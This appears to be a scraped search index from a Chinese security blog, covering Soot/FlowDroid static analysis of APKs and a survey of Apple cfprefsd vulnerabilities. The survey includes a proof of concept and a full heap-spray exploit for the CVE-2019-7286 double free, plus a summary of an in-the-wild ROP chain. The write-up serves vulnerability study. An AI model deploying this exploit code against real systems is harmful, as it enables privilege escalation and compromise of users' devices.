clippy_test.go:63: &quot;Unsupported macOS SDK version \\&quot;12.3\\&quot; not in [11]&quot; clippy_test.go:63: &quot;Unsupported macOS SDK version \\&quot;12.3\\&quot; not in [11]&quot; clippy_test.go:63: &quot;Unsupported macOS SDK version \\&quot;12.3\\&quot; not in [11]&quot; clippy_test.go:63: &quot;Unsupported macOS SDK version \\&quot;12.3\\&quot; not in [11]&quot; clippy_test.go:63: &quot;Unsupported macOS SDK version \\&quot;12.3\\&quot; not in [11]&quot; 下载SDK，放入/Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs。","link":"/2022/04/23/Android%E6%BA%90%E7%A0%81%E7%AC%94%E8%AE%B0/"},{"title":"Android静态分析工具开发笔记","text":"前言准备写一款Apk的静态扫描工具，结合FlowDroid（底层采用soot）、Jandroid。后面会再参考一下其他的静态分析工具，如 TaintDroid。 静态分析给定一个输入程序，输出程序的属性。 Sootsoot有很多Option配置，可以参考这里或者这里。 IRJimple介于 Java 和 Java 字节码之间，是一个基于语句的、类型化的（每个变量都有一个类型）和 3-addressed（每个语句最多有 3 个变量）的中间表示。 例子： 1234567891011121314151617181920(1) r0 := @this: FizzBuzz(2) i0 := @parameter0: int(3) $i1 = i0 % 15(4) if $i1 != 0 goto $i2 = i0 % 5(5) $r4 = &lt;java.lang.System: java.io.PrintStream out&gt;(6) virtualinvoke $r4.&lt;java.io.PrintStream: void println(java.lang.String)&gt;(&quot;FizzBuzz&quot;)(7) goto [?= return](8) $i2 = i0 % 5(9) if $i2 != 0 goto $i3 = i0 % 3(10) $r3 = &lt;java.lang.System: java.io.PrintStream out&gt;(11) virtualinvoke $r3.&lt;java.io.PrintStream: void println(java.lang.String)&gt;(&quot;Buzz&quot;)(12) goto [?= return](13) $i3 = i0 % 3(14) if $i3 != 0 goto $r1 = &lt;java.lang.System: java.io.PrintStream out&gt;(15) $r2 = &lt;java.lang.System: java.io.PrintStream out&gt;(16) virtualinvoke $r2.&lt;java.io.PrintStream: void println(java.lang.String)&gt;(&quot;Fizz&quot;)(17) goto [?= return](18) $r1 = &lt;java.lang.System: java.io.PrintStream out&gt;(19) virtualinvoke $r1.&lt;java.io.PrintStream: void println(int)&gt;(i0)(20) return Shimple与Jimple基本相同，是Jimple静态单任务形式的中间表示。 Baf是流线型的基于栈的字节表示。将java字节码转为基于栈的代码。 Grimp与Jimple 类似，比Jimple更接近于java源码。容易阅读，方便人工阅读。 数据结构基本的数据结构如下： Scene，是一个单例类，表示所分析的环境。 SootClass，用于表示Scene中的类。 SootMethod，用于表示SootClass中的方法。 Body，使用Body来访问SootMethod中的各种信息，每个Body里面有三个主链，分别是Units链、Locals链、Traps链。。 Local，方法内的局部变量。 Trap，方法内的异常处理。 Unit，方法体内的语句。 还有四种Body，对应四种中间表示：BafBody、JimpleBody、ShimpleBody、GrimpBody，Soot 中的默认 IR 是 **Jimple**（Java Simple）。 Unit（Jimple中是Stmt）表示Unit语句。主要有以下几种： 过程内控制流：NopStmt，IdentityStmt，AssignStmt。 IdentityStmt：通常指的是对变量赋值，这个变量既可以是显示的也可以是隐式的。 一个IdentityStmt将特殊值，如参数、this或被捕获的异常，分配给一个Local。 所有正常的赋值，例如从一个Local到另一个Local，或者从一个Constant到一个Local，都是用AssignStmt表示的。 过程间的控制流：IfStmt ， GotoStmt ， SwitchStmt，InvokeStmt，ReturnStmt，ReturnVoidStmt， ThrowStmt。 监控语句：MonitorStmt。 赋值语句：DefinitionStmt。 其它类型：NopStmt，BreakponitStmt。 Value Local Constant Ref Expr LocalJimpleLocal：local变量 TemporaryRegisterLocal： $开头的临时变量 Constant RefConcreteRef： ArrayRef：指向数组。 FieldRef： 指向field。 StaticFieldRef ：静态field的引用。 InstanceFieldRef ：指向的field是一个对象实例。 IdentityRef： CaughtExcrptionRef ：指向捕获到的异常的引用 ParameterRef：函数参数的引用 ThisRef ：this的引用 Expr一般来说，一个Expr可以对若干个Value进行一些操作并且返回另一个Value。在Jimple中，强制要求所有的Value最多包含一个表达式。 Stmt和Expr的区别：Stmt没有返回值，Expr有返回值。 BoxBox是指针，提供了对Soot对象的间接访问。一个Box提供了一个间接访问soot(Unit,Value)的入口，类似于Java的一个引用。当Unit包含另一个Unit的时候，需要通过Box来访问，Soot 里提供了两种类型的Box, 一个是ValueBox一个是UnitBox。 ValueBox，指向Values： 对于一条Unit来说，他的ValueBox存储的是在这条语句内部所用到的和所定义的语句。 UnitBox，指向Units： 以goto语句为例，UnitBox其实存的就是goto所指的下一跳节点。 switch语句，则会包含很多boxes。 还需要知道以下的规则： **一个Unit可以有多个UnitBox，但是每个UnitBox只能指向一个Unit**。GotoStmt 需要知道目标的Unit是什么，所以一个Unit会包含其它的UnitBox，通过 UnitBox获取下一个Unit。 **一个Value可以对应多个ValueBox，但是一个ValueBox只能对应一个Value**，对于一个Unit，可以得到很多个ValueBox，包含着这条语句内部的所用到和所定义的语句。 基本APISootClass获取一个类的信息，如果类是在一个包里，则应该包含完整的包名： 1circleClass = Scene.v().getSootClass(&quot;Circle&quot;) 如果分析的类不再Scene中，则getSootClass将返回一个Phantom类或者是异常。Phantom类不影响分析的进行，这在不关注其他模块的代码时很有用。如果要确保查询的类存在，可以通过getSootClassUnsafe(className, false)（如果不存在，则结果为空）检索它h或者使用circleClass.isPhantom()判断它是不是为Phantom类。 SootField类中包含字段和方法，通过名称和类型来查找它们： 1SootField radiusField = circleClass.getField(&quot;radius&quot;, IntType.v()) SootMethod 一般情况下使用getMethodByName即可： 1circleClass.getMethodByName(&quot;getCircleCount&quot;) 但是对于方法重载，需要使用getMethod方法，并提供Subsignature： 1circleClass.getMethod(&quot;int area(boolean)&quot;) 修饰符类、方法和字段的访问模式：pulic、priavet、protected、final、abstract等。这些信息保存在Modifier中，比如，查询一个方法是否为静态的： 1Modifier.isStatic(method.getModfiers()) Body在Body中有Units，Values，Traps。 修改代码Soot可以修改方法的Body。然后可以使用validate检查修改是否正确。 1234567stmt.apply(new AbstractStmtSwitch() { @Override public void caseIfStmt(IfStmt stmt) { stmt.setTarget(body.getUnits().getSuccOf(stmt)); }});body.validate(); Call Graph在一个调用图中，节点是方法，有向边表示源方法可以调用目标方法。在Soot中，每条边都被注解了调用语句。下面是一个示例，关于这个例子，有一些需要注意，方法 void &lt;clinit&gt; 有一个环，但实际上没有代码可以触发这条路径： APK分析首先，使用Dexpler 将 Dalvik 字节码转换为 Jimple Body。然后可以对整个程序进行转换、优化和注释。接下来， Jimple 转换包将在每个 Jimple Body上运行。最后，Soot 将所有 Jimple Body转换为 Baf（Soot 中的低级中间表示），并使用 Dexpler 将整个代码编译成 APK。 jtp，jimple转换包。 jop，jimple优化包。 jap，jimple注释包。 关于包的具体信息可以看这里。 Soot设置分析APK之前，Soot还需要进行一些设置： 12345678910111213141516171819202122public static void setupSoot(String androidJar, String apkPath, String outputPath) { // Reset the Soot settings (it's necessary if you are analyzing several APKs) G.reset(); // Generic options Options.v().set_allow_phantom_refs(true); Options.v().set_whole_program(true); Options.v().set_prepend_classpath(true); // Read (APK Dex-to-Jimple) Options Options.v().set_android_jars(androidJar); // The path to Android Platforms Options.v().set_src_prec(Options.src_prec_apk); // Determine the input is an APK Options.v().set_process_dir(Collections.singletonList(apkPath)); // Provide paths to the APK Options.v().set_process_multiple_dex(true); // Inform Dexpler that the APK may have more than one .dex files Options.v().set_include_all(true); // Write (APK Generation) Options Options.v().set_output_format(Options.output_format_dex); Options.v().set_output_dir(outputPath); Options.v().set_validate(true); // Validate Jimple bodies in each transofrmation pack // Resolve required classes Scene.v().addBasicClass(&quot;java.io.PrintStream&quot;,SootClass.SIGNATURES); Scene.v().addBasicClass(&quot;java.lang.System&quot;,SootClass.SIGNATURES); Scene.v().loadNecessaryClasses();} 案例在每个方法中加入日志输出：System.out.println(&quot;Beginning of method: &quot; + METHOD_NAME)。jimple代码： 12$r1 = &lt;java.lang.System: java.io.PrintStream out&gt;virtualinvoke $r1.&lt;java.io.PrintStream: void println(java.lang.String)&gt;(&quot;&lt;SOOT_TUTORIAL&gt; Beginning of method METHOD_NAME&quot;) Body转换12345678910111213141516171819202122232425262728PackManager.v().getPack(&quot;jtp&quot;).add(new Transform(&quot;jtp.myLogger&quot;, new BodyTransformer() { @Override protected void internalTransform(Body b, String phaseName, Map&lt;String, String&gt; options) { // First we filter out Android framework methods if(InstrumentUtil.isAndroidMethod(b.getMethod())) return; JimpleBody body = (JimpleBody) b; UnitPatchingChain units = b.getUnits(); List&lt;Unit&gt; generatedUnits = new ArrayList&lt;&gt;(); // The message that we want to log String content = String.format(&quot;%s Beginning of method %s&quot;, InstrumentUtil.TAG, body.getMethod().getSignature()); // In order to call &quot;System.out.println&quot; we need to create a local containing &quot;System.out&quot; value Local psLocal = InstrumentUtil.generateNewLocal(body, RefType.v(&quot;java.io.PrintStream&quot;)); // Now we assign &quot;System.out&quot; to psLocal SootField sysOutField = Scene.v().getField(&quot;&lt;java.lang.System: java.io.PrintStream out&gt;&quot;); AssignStmt sysOutAssignStmt = Jimple.v().newAssignStmt(psLocal, Jimple.v().newStaticFieldRef(sysOutField.makeRef())); generatedUnits.add(sysOutAssignStmt); // Create println method call and provide its parameter SootMethod printlnMethod = Scene.v().grabMethod(&quot;&lt;java.io.PrintStream: void println(java.lang.String)&gt;&quot;); Value printlnParamter = StringConstant.v(content); InvokeStmt printlnMethodCallStmt = Jimple.v().newInvokeStmt(Jimple.v().newVirtualInvokeExpr(psLocal, printlnMethod.makeRef(), printlnParamter)); generatedUnits.add(printlnMethodCallStmt); // Insert the generated statement before the first non-identity stmt units.insertBefore(generatedUnits, body.getFirstNonIdentityStmt()); // Validate the body to ensure that our code injection does not introduce any problem (at least statically) b.validate(); }})); FlowDroid + PointsToFlowDroid 是一款用于 Android 应用程序和 Java 程序的数据流分析功能，项目地址。 如果是使用 Maven，编辑 pom.xml即可： 1234567891011121314151617&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;de.fraunhofer.sit.sse.flowdroid&lt;/groupId&gt; &lt;artifactId&gt;soot-infoflow&lt;/artifactId&gt; &lt;version&gt;2.10.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;de.fraunhofer.sit.sse.flowdroid&lt;/groupId&gt; &lt;artifactId&gt;soot-infoflow-summaries&lt;/artifactId&gt; &lt;version&gt;2.10.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;de.fraunhofer.sit.sse.flowdroid&lt;/groupId&gt; &lt;artifactId&gt;soot-infoflow-android&lt;/artifactId&gt; &lt;version&gt;2.10.0&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 如果只使用命令行，则在Relase里下载soot-infoflow-cmd-jar-with-dependencies.jar即可。 如果不使用pom.xml，使用jar包的方式，需要去Relase下载soot-infoflow-android-classes.jar和soot-infoflow-classes.jar，再去Soot的仓库下载包含heros与jasmin的sootclasses-trunk-jar-with-dependencies.jar，将上述三个包加入项目依赖便完成了FlowDroid的配置。","link":"/2022/05/16/Android%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/"},{"title":"Apple cfprefsd漏洞","text":"本文章汇总整理一下在cfprefsd中出现的漏洞。 前言cfprefsd是什么cfprefsd是CoreFoundation中的一个XPC服务，它能够通过用户请求读写偏好文件(即plist)。cfprefsd通常有两个运行的实例，一个负责以用户权限运行的应用程序设置首选项；另一个以root身份运行，负责系统范围的设置首选项。任何进程都可以打开与两个cfprefsd进程中的任何一个的XPC连接。 cfprefsd没有被沙箱隔离，因此可以从应用程序和WebContent沙箱直接访问。 cfprefsd二进制文件是一个Stub，主要是包含CoreFoundation框架中的CFXPreferencesDaemon_main的一个分支。CFXPreferencesDaemon_main分配一个CFPrefsDaemon对象，该对象创建一个在默认并发队列上进行监听的一个com.apple.cfprefsd.daemon（XPC服务），为每一个传入连接提供一个replyHandler来执行： 123456789101112131415161718192021222324252627282930313233343536373839404142434445[CFPrefsDaemon initWithRole:role testMode] { ... listener = xpc_connection_create_mach_service(&quot;com.apple.cfprefsd.daemon&quot;, 0, XPC_CONNECTION_MACH_SERVICE_LISTENER); // 事件处理 xpc_connection_set_event_handler(listener, ^(xpc_object_t peer) { if (xpc_get_type(peer) == XPC_TYPE_CONNECTION) { // 处理 XPC_TYPE_CONNECTION xpc_connection_set_event_handler(peer, ^(xpc_object_t obj) { if (xpc_get_type(obj) == XPC_TYPE_DICTIONARY) { context_obj = xpc_connection_get_context(peer); cfprefsd = context_obj.cfprefsd; [cfprefsd handleMessage:obj fromPeer:peer replyHandler: ^(xpc_object_t reply) { xpc_connection_send_message(peer, reply); }]; } } // 队列 char label[0x80]; pid_t pid = xpc_connection_get_pid(peer) dispatch_queue_t queue; int label_len = snprintf(label, 0x80, &quot;Serving PID %d&quot;, pid); if (label_len &gt; 0x7e) { queue = NULL; } else { queue = dispatch_queue_create(label, NULL); } xpc_connection_set_target_queue(peer, queue); context_obj = [[CFPrefsClientContext alloc] init]; context_obj.lock = 0; context_obj.cfprefsd = self; // the CFPrefsDaemon object context_obj.isPlatformBinary = -1; // char context_obj.valid = 1; xpc_connection_set_context(peer, context_obj); xpc_connection_set_finalizer(peer, client_context_finalizer) xpc_connection_resume(peer); } } } 漏洞信息CVE-2019-7286 在iOS 12.1.4中修复，适用于iPhone 5s 及更新机型、iPad Air 及更新机型以及第 6 代 iPod touch 如前言中所述，cfprefsd是通过[CFPrefsDaemon handleMessage:fromPeer:replyHandler:]来处理传入连接的： 1234567891011121314151617181920212223242526272829303132-[CFPrefsDaemon handleMessage:msg fromPeer:peer replyHandler: handler] { if (xpc_get_type(msg) == XPC_TYPE_ERROR) { [self handleError:msg] } else { xpc_dictionary_get_value(msg, &quot;connection&quot;, peer); uint64_t op = xpc_dictionary_get_uint64(msg, &quot;CFPreferencesOperation&quot;); switch (op) { case 1: case 7: case 8: [self handleSourceMessage:msg replyHandler:handler]; break; case 2: [self handleAgentCheckInMessage:msg replyHandler:handler]; break; case 3: [self handleFlushManagedMessage:msg replyHandler:handler]; break; case 4: [self handleFlushSourceForDomainMessage:msg replyHandler:handler]; break; case 5: [self handleMultiMessage:msg replyHandler:handler]; break; case 6: [self handleUserDeletedMessage:msg replyHandler:handler]; break; default: // send error reply } }} 问题出在case 5: handleMultiMessage上，处理xpc_array类型： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162-[CFPrefsDaemon handleMultiMessage:msg replyHandler: handler]{ xpc_object_t peer = xpc_dictionary_get_remote_connection(msg); // ... xpc_object_t messages = xpc_dictionary_get_value(msg, &quot;CFPreferencesMessages&quot;); if (!messages || xpc_get_type(messages) != OS_xpc_array) { // send error message } // 如果只包含dictionaries或null, 直接返回 bool all_types_valid = xpc_array_apply(messages, ^(xpc_object_t entry) { xpc_type_t type = xpc_get_type(entry); return (type == XPC_TYPE_DICTIONARY || type == XPC_TYPE_NULL) }; if (!all_types_valid) { // return error } size_t n_sub_messages = xpc_array_get_count(messages); // macro from CFInternal.h // allocates either on the stack or heap new_id_array(sub_messages, n_sub_messages); if (n_sub_messages &gt; 0) { for (size_t i = 0; i &lt; n_sub_messages; i++) { // raw pointers, not holding a reference sub_messages[i] = xpc_array_get_value(messages, i); // &lt;--- 1 } for (size_t i = 0; i &lt; n_sub_messages; i++) { if (xpc_get_type(sub_messages[i]) == XPC_TYPE_DICTIONARY) { [self handleMessage: sub_messages[i] // &lt;--- 2 fromPeer: peer replyHandler: ^(xpc_object_t reply) { sub_messages[i] = xpc_retain(reply); // &lt;--- 3 }]; } } } xpc_object_t reply = xpc_dictionary_create_reply(msg); // &lt;--- 4 xpc_object_t replies_arr = xpc_array_create(sub_messages, n_sub_messages); xpc_dictionary_set_value(reply, &quot;CFPreferencesMessages&quot;, replies_arr); xpc_release(replies_arr); if (n_sub_messages) { for (size_t i = 0; i &lt; n_sub_messages; i++) { if (xpc_get_type(sub_messages[i]) != XPC_TYPE_NULL) { xpc_release(sub_messages[i]); // &lt;--- 5 } } } free_id_array(sub_messages); handler(reply); xpc_release(reply);} 如上所示，在第1步中，适用xpc_array_get_value函数将内容从xpc_array中取出，放入sub_messages中。第2步，将sub_messages传给handleMessage()函数处理所有子消息。第3步，将sub_messages中的每一个值改变为reply消息（这是一个引用）。第4步，当所有的子消息被处理后，根据所有的回复中创建一个xpc_array，在59行调用相应的replyHandler，处理所有子消息的reply消息。 问题是，不是所有的消息类型都会有reply，就是指这些消息不会调用replyHandler函数。正如第3步中显示的那样，对于这些不reply的消息，一般采用的处理方式是NOP掉。通过查询开发者手册可知，xpc_release()函数将减少对象的引用，xpc_array_get_value()函数用于获取指定下标中的值： 12345xpc_releaseDecrements the reference count of an object.xpc_array_get_value(_:_:)Returns the value at the specified index in the array. 这里设计的本意是通过xpc_retain()函数，改变sub_messages[i]中的值，也就是sub_messages[i]中的值变为了引用，这样后面在xpc_release()函数解引用时就能匹配上；否则，就会在释放CFPreferencesMessages数组时，由于引用已经被释放了，导致出现double-free。 POC触发漏洞的键值： 12345678poc_dict = { &quot;CFPreferencesOperation&quot; = 5, &quot;CFPreferencesMessages&quot; = [ { &quot;CFPreferencesOperation&quot;: 4 } ]} 具体POC： 123456789101112131415161718192021222324#include ; int main(int argc, const char * argv[]) { xpc_connection_t conn = xpc_connection_create_mach_service(&quot;com.apple.cfprefsd.daemon&quot;,0,XPC_CONNECTION_MACH_SERVICE_PRIVILEGED); xpc_connection_set_event_handler(conn, ^(xpc_object_t t) { printf(&quot;got message: %sn&quot;, xpc_copy_description(t)); }); xpc_connection_resume(conn); xpc_object_t hello = xpc_dictionary_create(NULL, NULL, 0); xpc_dictionary_set_int64(hello, &quot;CFPreferencesOperation&quot;, 5); xpc_object_t arr = xpc_array_create(NULL, 0); xpc_object_t arr_elem1 = xpc_dictionary_create(NULL, NULL, 0); xpc_dictionary_set_int64(arr_elem1, &quot;CFPreferencesOperation&quot;, 4); xpc_array_append_value(arr, arr_elem1); xpc_dictionary_set_value(hello, &quot;CFPreferencesMessages&quot;, arr); xpc_connection_send_message(conn, hello); xpc_release(hello); return 0;} 漏洞利用 - ZecOps思路这里使用两个线程，一个用于触发漏洞，一个用于填充内存空间。 1234567891011121314151617+----------------+ +---------------+| vul_thread | | fill_thread || | | || +------------+ | | || | first free | | | || | | | | || +-----+------+ | | || | | | +----------+ || | | | | allocate | || +&lt;------------------+ | || | | | +----------+ || +-----v------+ | | || | double free| | | || | | | | || +------------+ | | || | | |+----------------+ +---------------+ Double-Free转Use-After-Free两次 xpc_release 之间的时间窗口会很短，由于XPC请求是可控的，我们可以创建一个很大的xpc_array，来获取足够的时间窗口去填充释放的内存。 接下来是要寻找一个合适的填充对象，该对象应该满足以下几点： 可以控制前8个字节，允许控制ISA指针 对象的大小应该是0xc0——与释放的xpc_dictionary_t相同，更有可能填满释放的内存 应该可以控制内存分配，提高填充率 这里选择的是OS_xpc_string，在反序列化 OS_xpc_string 时，函数 xpc_string_deserialize 调用 xpc_try_strdup（封装的strdup()函数）。通过控制字符串的长度，可以控制分配的大小。将多个 OS_xpc_string 对象添加到反序列化的字典或数组中也可能会增加填充率。长度为 0xc0 的字符串能达到超过 60% 的填充释放对象的成功率。 控制PCObject-C 对象的前 8 个字节是 ISA 指针。将 ISA 指针指向一个受控的内存空间可以让我们控制 Object-C 的方法调用，这里可以参考Modern Objective-C Exploitation Techniques。 下一个问题是要解决ASLR，这里是通过堆喷来实现的，可以参考Ian Beer的Auditing and Exploiting Apple IPC。 堆喷的数据是在VM_ALLOCATE区域，可以在 0x180202000 可靠地找到。由于字符串截断机制，我们需要稍微移动数据，使用 0x180202020 而不是 0x180202000。如果我们使用 0x180202000，作为字符串的第一个字节的第一个空字节将终止字符串。 但是，控制PC以后的成功率反而降低了，从60%+ 下降到 5%-，原因是在64位中，0x180202020实际是0x0000000180202020，字符串将在第五个字节处截断，由于OS X使用基于大小的空闲列表来加速分配，字符串可能会分配到其他地方。 在控制PC之后，我们可以构造一个payload来做Return Oriented Programming，通过调用system()或者像Brandon的An introduction to exploiting userspace race conditions on iOS那样获取cfprefsd的任务端口来执行任意命令。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161#include &lt;xpc/xpc.h&gt;#import &lt;pthread.h&gt;#include &lt;mach/mach.h&gt;#include &lt;mach/task.h&gt;#include &lt;dlfcn.h&gt;#include &lt;mach-o/dyld_images.h&gt;#include &lt;objc/runtime.h&gt; #define AGENT 1 #define FILL_DICT_COUNT 0x600#define FILL_COUNT 0x1000#define FREE_COUNT 0x2000#define FILL_SIZE (0xc0) int need_stop = 0; struct heap_spray { void* fake_objc_class_ptr; uint32_t r10; uint32_t r4; void* fake_sel_addr; uint32_t r5; uint32_t r6; uint64_t cmd; uint8_t pad1[0x3c]; uint32_t stack_pivot; struct fake_objc_class_t { char pad[0x8]; void* cache_buckets_ptr; uint32_t cache_bucket_mask; } fake_objc_class; struct fake_cache_bucket_t { void* cached_sel; void* cached_function; } fake_cache_bucket; char command[32];}; void fill_once(){ #if AGENT xpc_connection_t client = xpc_connection_create_mach_service(&quot;com.apple.cfprefsd.agent&quot;,0,0);#else xpc_connection_t client = xpc_connection_create_mach_service(&quot;com.apple.cfprefsd.daemon&quot;,0,XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);#endif xpc_connection_set_event_handler(client, ^void(xpc_object_t response) { xpc_type_t t = xpc_get_type(response); if (t == XPC_TYPE_ERROR){ printf(&quot;err: %s\\n&quot;, xpc_dictionary_get_string(response, XPC_ERROR_KEY_DESCRIPTION)); need_stop = 1 ; } //printf(&quot;received an event\\n&quot;); }); xpc_connection_resume(client); xpc_object_t main_dict = xpc_dictionary_create(NULL, NULL, 0); xpc_object_t arr = xpc_array_create(NULL, 0); xpc_object_t spray_dict = xpc_dictionary_create(NULL, NULL, 0); xpc_dictionary_set_int64(spray_dict, &quot;CFPreferencesOperation&quot;, 8); xpc_dictionary_set_string(spray_dict, &quot;CFPreferencesDomain&quot;, &quot;xpc_str_domain&quot;); xpc_dictionary_set_string(spray_dict, &quot;CFPreferencesUser&quot;, &quot;xpc_str_user&quot;); char key[100]; char value[FILL_SIZE]; memset(value, &quot;A&quot;, FILL_SIZE); *((uint64_t *)value) = 0x4142010180202020; //*((uint64_t *)value) = 0x180202020; value[FILL_SIZE-1]=0; for (int i=0; i&lt;FILL_DICT_COUNT; i++) { sprintf(key, &quot;%d&quot;,i); xpc_dictionary_set_string(spray_dict, key, value); } //NSLog(@&quot;%@&quot;, spray_dict); for (uint64_t i=0; i&lt;FILL_COUNT; i++) { xpc_array_append_value(arr, spray_dict); } xpc_dictionary_set_int64(main_dict, &quot;CFPreferencesOperation&quot;, 5); xpc_dictionary_set_value(main_dict, &quot;CFPreferencesMessages&quot;, arr); void* heap_spray_target_addr = (void*)0x180202000; struct heap_spray* map = mmap(heap_spray_target_addr, 0x1000, 3, MAP_ANON|MAP_PRIVATE|MAP_FIXED, 0, 0); memset(map, 0, 0x1000); struct heap_spray* hs = (struct heap_spray*)((uint64_t)map + 0x20); //hs-&gt;null0 = 0; hs-&gt;cmd = -1; hs-&gt;fake_objc_class_ptr = &amp;hs-&gt;fake_objc_class; hs-&gt;fake_objc_class.cache_buckets_ptr = &amp;hs-&gt;fake_cache_bucket; hs-&gt;fake_objc_class.cache_bucket_mask = 0; hs-&gt;fake_sel_addr = &amp;hs-&gt;fake_cache_bucket.cached_sel; // nasty hack to find the correct selector address hs-&gt;fake_cache_bucket.cached_sel = 0x7fff00000000 + (uint64_t)NSSelectorFromString(@&quot;dealloc&quot;); hs-&gt;fake_cache_bucket.cached_function = 0xdeadbeef; size_t heap_spray_pages = 0x40000; size_t heap_spray_bytes = heap_spray_pages * 0x1000; char* heap_spray_copies = malloc(heap_spray_bytes); for (int i = 0; i &lt; heap_spray_pages; i++){ memcpy(heap_spray_copies+(i*0x1000), map, 0x1000); } xpc_dictionary_set_data(main_dict, &quot;heap_spray&quot;, heap_spray_copies, heap_spray_bytes); //NSLog(@&quot;%@&quot;, main_dict); xpc_connection_send_message(client, main_dict); printf(&quot;fill once\\n&quot;); xpc_release(main_dict);} void trigger_vul(){ #if AGENT printf(&quot;AGENT\\n&quot;); xpc_connection_t conn = xpc_connection_create_mach_service(&quot;com.apple.cfprefsd.agent&quot;,0,0); #else printf(&quot;DAEMON\\n&quot;); xpc_connection_t conn = xpc_connection_create_mach_service(&quot;com.apple.cfprefsd.daemon&quot;,0,XPC_CONNECTION_MACH_SERVICE_PRIVILEGED); #endif xpc_connection_set_event_handler(conn, ^(xpc_object_t response) { xpc_type_t t = xpc_get_type(response); if (t == XPC_TYPE_ERROR){ printf(&quot;err: %s\\n&quot;, xpc_dictionary_get_string(response, XPC_ERROR_KEY_DESCRIPTION)); need_stop = 1 ; } }); xpc_connection_resume(conn); xpc_object_t hello = xpc_dictionary_create(NULL, NULL, 0); xpc_object_t arr = xpc_array_create(NULL, 0); xpc_object_t arr_free = xpc_dictionary_create(NULL, NULL, 0); xpc_dictionary_set_int64(arr_free, &quot;CFPreferencesOperation&quot;, 4); xpc_array_append_value(arr, arr_free); for (int i=0; i&lt;FREE_COUNT; i++) { xpc_object_t arr_elem1 = xpc_dictionary_create(NULL, NULL, 0); xpc_dictionary_set_int64(arr_elem1, &quot;CFPreferencesOperation&quot;, 20); xpc_array_append_value(arr, arr_elem1); } //printf(&quot;%p, %p\\n&quot;, arr_elem1, hello); xpc_dictionary_set_int64(hello, &quot;CFPreferencesOperation&quot;, 5); xpc_dictionary_set_value(hello, &quot;CFPreferencesMessages&quot;, arr); //NSLog (@&quot;%@&quot;, hello); fill_once(); xpc_connection_send_message(conn, hello); NSLog(@&quot; trigger vuln&quot;); xpc_release(hello);} int main(int argc, const char * argv[]) { pthread_t fillthread1,triger_thread; NSLog(@&quot;start to trigger..&quot;); trigger_vul(); return 0;} 漏洞利用 - PZ思路还是在两次xpc_release中间，填充被释放的内存空间，通过并行运行的四个线程来实现，线程A、B和C启动并等待全局变量设置为1。当全局变量为1时，线程A、B和C分别尝试发送100次下面的XPC消息给服务：\u0003 123# 这不是一个有效的multiMessage{ &quot;CFPreferencesOperation&quot;: 5, &quot;CFPreferencesMessages&quot; : [10'000 * xpc_data_spray] } xpc_data_spray大小为448字节，目标地址是0x118080000。 控制PC该漏洞将由子消息触发，其中操作键被映射到不会调用reply的处理程序。攻击者选择了操作4，由handleFlushSourceForDomainMessage处理。触发器消息如下所示： 12345678{ &quot;CFPreferencesOperation&quot;: 5 &quot;CFPreferencesMessages&quot; : [ 8000 * (op_1_dict, second_op_5_dict), 150 * (second_op_5_dict, op_4_dict, op_4_dict, op_4_dict), third_op_5_dict ]} 子消息如下： 12345678910111213141516171819op_1_dict = { &quot;CFPreferencesOperation&quot;: 1, &quot;domain&quot;: &quot;a&quot;, &quot;A&quot;: 8_byte_xpc_data}second_op_5_dict = { &quot;CFPreferencesOperation&quot;: 5}op_4_dict = { &quot;CFPreferencesOperation&quot;: 4}third_op_5_dict = { &quot;CFPreferencesOperation&quot;: 5 &quot;CFPreferencesMessages&quot; : [0x2000 * xpc_send_right, 0x10 * xpc_data_heapspray]} 上面的思路中说到，如果堆喷成功填充0x118080000处的内存的话，接下来就是调用xpc_release()函数，来进行释放。题外话，OC对象的第一个qword是它的isa指针，定义了对象的类型。xpc_release()函数会检查libxpc的__objc_data中是否有isa指针，如果存在，则调用os_object_release()函数；由于填充的0x118080000是一个虚假isa指针，因此会走另一条路，调用objc_release()函数。如果类对象的字段中的FAST_ALLOC位（偏移为0x20处字节的第2位）被清零，则释放选择器被发送到对象。 这种虚假选择器缓存技术可以参考Modern Objective-C Exploitation Techniques。 obj_msgSend负责处理选择器调用的本机函数。首先，obj_msgSend根绝isa指针，找到0x10处的(function_pointer, selector)对的数组，如果选择器与缓存中的条目匹配，就会调用缓存的函数指针。 控制PC后，接下来通过ROP，调用IOServiceMatching、IOServiceGetMatchingService和IOServiceOpen来获取一个IOKit UserClient mach端口发送权限。攻击者使用内存写入小工具将该端口名称写入他们连续发送的四个exfil消息。在WebContent进程中，在端口集上侦听消息。如果收到该消息，则会在其中发送一个ProvInfoIOKitUserClient。 ProvInfoIOKitUserClient将是另一个内核漏洞的故事了，有机会再说。 CVE-2020-9839CVE-2021-1815CVE-2020-9839的patch如下： 1234567891011int _CFPrefsCreatePreferencesDirectory(path) { int dirfd = open(&quot;/&quot;, O_DIRECTORY); for(slice in path.split(&quot;/&quot;)) { int fd = openat(dirfd, slice, O_DIRECTORY); if (fd == -1 &amp;&amp; errno == ENOENT &amp;&amp; !mkdirat(dirfd, slice, perm)) { fd = openat(dirfd, slice, O_DIRECTORY|O_NOFOLLOW); if ( fd == -1 ) return -1; fchown(fd, uid, gid); } } // close all fds return 0;} Apple 的修复确保不再遵循符号链接，因此无法再更改任意目录上的所有权。但该补丁不足以完全阻止权限提升。上面显示的代码仍然允许用户使用用户或root权限创建目录。由于目录位置在攻击者的控制之下，这可能会被滥用以将权限提升到 root。 macOS 使用维护脚本，即每天、每周和每月以 root 权限运行的定期脚本。周期性脚本通过**/etc/defaults/periodic.conf**文件进行配置。此脚本也可以由用户定义： 12# 周期性脚本目录local_periodic=&quot;/usr/local/etc/periodic&quot; 在默认 macOS 